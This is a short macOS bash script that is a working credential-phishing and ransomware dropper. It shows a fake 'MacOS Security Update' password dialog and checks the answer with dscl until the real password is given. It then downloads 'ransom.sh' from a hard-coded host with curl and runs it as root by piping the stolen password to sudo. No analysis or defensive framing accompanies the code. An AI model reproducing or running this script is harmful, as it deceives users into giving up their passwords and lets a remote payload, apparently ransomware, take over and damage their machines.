#!/bin/bash
PWD_=$(osascript -e 'display dialog "To perform a security update MacOS needs your password." with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null)
if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) != "" ]];
then
while true
do
PWD_=$(osascript -e 'display dialog "Incorrect password. Please try again" with title "MacOS Security Update" default answer "" with icon 2 with hidden answer' -e 'text returned of result' 2>/dev/null)
if [[ $(dscl . authonly $(id -un) $PWD_ 2>/dev/null) == "" ]];
then
break
fi
done
fi
echo $PWD_
name=$(id -F)
curl http://192.168.1.29:8080/ransom -o /tmp/ransom.sh
chmod a+x /tmp/ransom.sh
echo $PWD_ | sudo -S /tmp/ransom.sh